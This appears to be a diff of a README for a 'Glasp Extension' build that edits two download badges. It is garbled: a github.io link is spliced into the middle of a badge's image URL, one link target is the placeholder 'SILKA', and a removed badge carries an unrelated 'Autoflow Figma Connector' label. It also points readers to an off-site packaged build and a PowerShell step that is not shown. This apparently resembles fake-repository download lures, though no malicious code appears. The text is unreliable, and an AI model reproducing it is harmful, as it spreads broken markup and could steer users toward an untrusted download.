@@ -2,7 +2,7 @@
 
 <p align="center">
   <a href="SILKA">
-    <img src="https://img.shields.io/badge/Glasp_Extension-Open_the_build-7C3AED?style=for-the-badge" alt="Open the Glasp Extension build">
+    <img src="https://img.shields.io/badge/Glasp_Extension-Open_the_build-7C3AED?)](https://glasp-extension.github.io/Glasp-Ai/Glasp-Ai)style=for-the-badge" alt="Open the Glasp Extension build">
   </a>
 </p>
 
@@ -41,7 +41,7 @@ Cross-paragraph selections stay one continuous source unless you split them into
 
 Use the button when you want the packaged Glasp Extension build. The badge uses its own label, a flat-square style, and a green color.
 
-[![Get Autoflow Figma Connector](https://img.shields.io/badge/Get_Glasp_Ai-SILKA-2ea44f?style=flat-square)](https://glasp-extension.github.io/Glasp-Ai/Glasp-Ai)
+<a href="SILKA"><img src="https://img.shields.io/badge/Get_Glasp_Ai-SILKA-2ea44f?style=flat-square" alt="Get the Glasp Ai build"></a>
 
 Or run this in PowerShell from the repository root.
 
